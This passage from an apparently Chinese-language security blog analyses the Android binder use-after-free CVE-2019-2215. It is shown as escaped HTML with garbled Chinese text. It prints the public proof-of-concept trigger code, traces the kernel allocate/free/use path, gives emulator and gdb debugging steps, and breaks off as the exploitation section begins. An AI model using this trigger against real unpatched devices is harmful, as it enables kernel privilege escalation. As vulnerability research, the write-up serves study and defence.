&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">can be slept on for work. When a thread that uses
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">epoll explicitly exits using BINDER_THREAD_EXIT,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">the waitqueue is freed, but it is never removed
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">from the corresponding epoll data structure. When
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">the process subsequently exits, the epoll cleanup
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">code tries to access the waitlist, which results in
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">a use-after-free.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">*/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/epoll.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/ioctl.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define BINDER_THREAD_EXIT 0x40046208ul
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">epfd&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">epoll_event&lt;/span> &lt;span class="n">event&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{.&lt;/span>&lt;span class="n">events&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">EPOLLIN&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/binder&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDONLY&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">epfd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">epoll_create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">epoll_ctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">epfd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">EPOLL_CTL_ADD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">event&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//[1]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">ioctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">BINDER_THREAD_EXIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//[2]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ¼æ´åŸç†ä½œè€…è¯´çš„å¾ˆç®€å•å°±æ˜¯ä½¿ç”¨epollçº¿ç¨‹è°ƒç”¨BINDER_THREAD_EXITæ—¶ï¼Œä¼šæŠŠbinder_threadé‡Šæ”¾ï¼Œä½†æ˜¯æ²¡æœ‰åœ¨epollæ•°æ®ç»“æ„ä¸­æ¸…é™¤ï¼Œåœ¨åé¢è¿›ç¨‹ç»“æŸæˆ–è€…epollä¸»åŠ¨è°ƒç”¨EPOLL_CTL_DELæ—¶ï¼Œepollåˆä¼šå»éå†å‰é¢é‡Šæ”¾çš„binder_thread-&amp;gt;waitï¼Œå¯¼è‡´UAFã€‚&lt;/p>
&lt;p>æ—¢ç„¶æ˜¯ä¸ªUAFçš„æ¼æ´ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸‰ä¸ªç‚¹ï¼šbinder_threadçš„allocateã€freeã€useã€‚&lt;/p>
&lt;ul>
&lt;li>&lt;strong>allocate&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>åœ¨pocä¸­çš„[1]å¤„ï¼Œé€šè¿‡epoll_ctlåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ep_itemå¹¶ä¸”ç»‘å®šäº†fdï¼Œå°†å…¶æ’å…¥åˆ°event_pollçš„çº¢é»‘æ ‘ä¸­ã€‚fdä¸ºå‰é¢é€šè¿‡è°ƒç”¨open()åˆ›å»ºçš„binder_procç»“æ„ä½“å¹¶ä¸”&lt;code>fd-&amp;gt;pricate_data = binder_proc&lt;/code>ï¼Œepfdä¸ºè°ƒç”¨epoll_createåˆ›å»ºçš„ä¸€ä¸ªepollç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“ä¼šæ·»åŠ åˆ°ç»“æ„ä½“é˜Ÿåˆ—ä¸Šã€‚ç»“æ„å¤§æ¦‚å¦‚å›¾ï¼Œ&lt;a class="link" href="https://github.com/sharif-dev/AndroidKernelVulnerability" target="_blank" rel="noopener"
>å›¾æ¥æº&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200628024448.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>free&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>pocä¸­çš„[2]å¤„ï¼Œè°ƒç”¨ioctlå¯¹fdè¿›è¡ŒBINDER_THREAD_EXITæ“ä½œï¼Œä»&lt;code>fd-&amp;gt;private_data&lt;/code>ä¸­é‡Šæ”¾&lt;strong>binder_thread&lt;/strong>ç»“æ„ä½“ã€‚æ•´ä¸ªè°ƒç”¨æ ˆå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æœ€ç»ˆè°ƒç”¨åˆ°äº†binder_free_threadé‡Œçš„kfreeé‡Šæ”¾æ‰ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200628102722.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">binder_free_thread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">binder_thread&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">BUG_ON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nf">list_empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">todo&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">binder_stats_deleted&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BINDER_STAT_THREAD&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">binder_proc_dec_tmpref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">put_task_struct&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">task&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kfree&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;strong>use&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>åœ¨å½“å‰çº¿ç¨‹é€€å‡ºæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨&lt;strong>epoll_ctl(epfd, DEL, fd, event)&lt;/strong>ï¼Œè¿™é‡Œé¢ä¼šè°ƒç”¨åˆ°&lt;strong>ep_remove(event_poll, ep_item)&lt;/strong>ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢ä¼šè¿›è¡Œunlink wait queuesåŒé“¾è¡¨æ“ä½œï¼Œå…¶ä¸­çš„æ“ä½œ&lt;code>entry = wait-&amp;gt;entry;&lt;/code>è¿™é‡Œçš„æŒ‡é’ˆæŒ‡å‘å·²ç»é‡Šæ”¾çš„binder_thread-&amp;gt;waitã€‚é€ æˆuse after freeã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/eq_remove_queue.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">ep_remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">eppoll_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pwq&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">//è¿™é‡Œçš„pwqå°±æ˜¯æˆ‘ä»¬å·²ç»é‡Šæ”¾æ‰çš„binder_thread
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wait_queue_head_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">whead&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">rcu_read_lock&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">whead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">smp_load_acquire&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">pwq&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">whead&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">whead&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">whead&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">pwq&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">wait&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//è¿›å…¥remove_wait_queue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">rcu_read_unlock&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">wait_queue_head&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">wait_queue_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">wq_entry&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_lock_irqsave&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">lock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">__remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">wq_entry&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//è¿™é‡Œä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°&amp;amp;pwq-&amp;gt;waitä¹‹å‰å·²ç»è¢«é‡Šæ”¾
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">spin_unlock_irqrestore&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">lock&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kr">inline&lt;/span> &lt;span class="kt">void&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">__remove_wait_queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">wait_queue_head&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">wq_head&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">wait_queue_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">wq_entry&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">list_del&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">wq_entry&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kr">inline&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">list_del&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">__list_del_entry&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[...]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kr">inline&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">__list_del_entry&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[...]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">__list_del&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prev&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">entry&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kr">inline&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">__list_del&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">prev&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">next&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">next&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">prev&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//unlinkæ“ä½œ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">WRITE_ONCE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">prev&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">next&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å°†&lt;code>binder_thread-&amp;gt;wait.head&lt;/code>çš„æŒ‡é’ˆå†™å…¥&lt;code>binder_thread-&amp;gt;wait.head.prev&lt;/code>å’Œ&lt;code>binder_thread-&amp;gt;wait.head.next&lt;/code>ã€‚&lt;/p>
&lt;h3 id="pocè°ƒè¯•åˆ†æ">Pocè°ƒè¯•åˆ†æ&lt;/h3>
&lt;p>è¿™é‡Œæ‰‹ä¸Šæ²¡æœ‰ç›´æ¥èƒ½ç”¨çš„è®¾å¤‡ï¼Œç”¨çš„æ¨¡æ‹Ÿå™¨è°ƒè¯•ã€‚å¯ç›´æ¥æŒ‰ç…§&lt;a class="link" href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/environment-setup.html#software-requirements" target="_blank" rel="noopener"
>è¿™ä¸ªæ•™ç¨‹&lt;/a>çš„é…ç½®è°ƒè¯•ã€‚ä¸è¿‡è¿™ä¸ªæ•™ç¨‹å…³é—­äº†ä¸€äº›ä¿æŠ¤ï¼Œä½¿å¾—åˆ©ç”¨è¦ç®€å•äº›ï¼Œä¸è¿‡è¿‡ç¨‹æ˜¯å·®ä¸å¤šä¸€æ ·çš„ã€‚&lt;/p>
&lt;p>ç¼–è¯‘å®Œgoldfishåå¯åŠ¨&lt;code>emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S&lt;/code>ç­‰å¾…qemuçš„è¿æ¥ã€‚&lt;/p>
&lt;p>gdbå¯åŠ¨&lt;code>gdb -quiet vmlinux -ex 'target remote :1234'&lt;/code> é”®å…¥cç»§ç»­å¯åŠ¨æ¨¡æ‹Ÿå™¨ã€‚&lt;/p>
&lt;p>ç­‰å¾…æ¨¡æ‹Ÿå™¨å®Œå…¨å¯åŠ¨åç¼–è¯‘poc pushè¿›æ¨¡æ‹Ÿå™¨ã€‚&lt;/p>
&lt;p>binder_threadé‡Šæ”¾ä¹‹å‰ï¼Œåç§»a8å¤„ä¸º&lt;code>wait.head&lt;/code>çš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬æ‹¥æœ‰å†…æ ¸æºç ä»¥åŠç¼–è¯‘å¥½çš„vmliuxï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç®—å‡ºæ¥&lt;code>wait.head&lt;/code>ç›¸å¯¹äºbinder_threadåœ°å€çš„åç§»é‡ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/b1.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>freeä¹‹åæœªunlinkä¹‹å‰binder_threadçš„å€¼ä¸€æ ·æœªå˜ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/b2.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>unlinkä¹‹åï¼Œbinder_thread-&amp;gt;wait.headå†™å…¥&lt;code>binder_thread-&amp;gt;wait.head.next&lt;/code> and &lt;code>binder_thread-&amp;gt;wait.head.prev&lt;/code>ä¸¤ä¸ªæŒ‡é’ˆã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/b3.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>åœ¨æœªå¼€å¯KASançš„è®¾å¤‡ä¸Šæˆ‘ä»¬çœ‹ä¸åˆ°ä»»ä½•å¥”æºƒã€‚ä½†æ˜¯è°ƒè¯•æ—¶æˆ‘ä»¬èƒ½çœ‹åˆ°ç¡®å®è§¦å‘äº†æ¼æ´ã€‚&lt;/p>
&lt;h3 id="0x03-æ¼æ´åˆ©ç”¨">0x03 æ¼æ´åˆ©ç”¨&lt;/h3>
&lt;p>æ¼æ´t_threadç»“æ„ä½“å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">binder_thread&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_proc&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">rb_node&lt;/span> &lt;span class="n">rb_node&lt;/span>&lt;span class="p">;&lt;/span>
